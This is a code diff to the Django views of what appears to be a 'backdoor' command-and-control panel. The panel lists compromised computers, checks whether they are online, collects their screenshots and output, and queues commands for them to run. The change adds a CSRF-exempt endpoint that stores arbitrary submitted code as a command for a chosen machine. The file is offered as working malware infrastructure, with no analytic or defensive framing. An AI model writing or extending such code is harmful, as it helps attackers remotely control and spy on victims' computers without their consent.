@@ -1,5 +1,5 @@
 from django.shortcuts import render, redirect
-from django.http import JsonResponse, HttpResponse
+from django.http import JsonResponse
 from .models import Output, Computer, Command, Files
 from .forms import CodeForm, ScreenShotForm, OutputForm
 from datetime import timedelta
@@ -15,17 +15,7 @@ def home(request):
 
 def computer_detail(request, pc_id):
     computer = Computer.objects.all().filter(id=pc_id)[0]
-    form = CodeForm(request.POST)
-    if request.method == 'POST':
-        if form.is_valid():
-            code = form.cleaned_data['code']
-            Command(command=code, target=computer).save()
-            print(code)
-        else:
-            form = CodeForm()
-
-
-    return render(request, "backdoor/pc_detail.html", {'pc':computer, 'form':form})
+    return render(request, "backdoor/pc_detail.html", {'pc':computer})
 
 def ajax(request, pk):
     data = ""
@@ -36,7 +26,7 @@ def ajax(request, pk):
 
 def check_pc_online(request, pk):
     computer = Computer.objects.all().filter(id=pk)[0]
-    within_3_seconds = timezone.now() - timedelta(seconds=10)
+    within_3_seconds = timezone.now() - timedelta(seconds=1)
     if within_3_seconds > computer.last_online:
         return JsonResponse({"data":"offline"})
     else:
@@ -97,3 +87,12 @@ def output(request, pk, command_id):
     
     return render(request, "backdoor/output.html", {'form':form})
 
+@csrf_exempt
+def send_command(request, computer_id):
+    if request.method == 'POST':
+        form = CodeForm(request.POST)
+        if form.is_valid():
+            code = form.cleaned_data['code']
+            computer = Computer.objects.get(id=computer_id)
+            Command(command=code, target=computer).save()
+    return JsonResponse({})
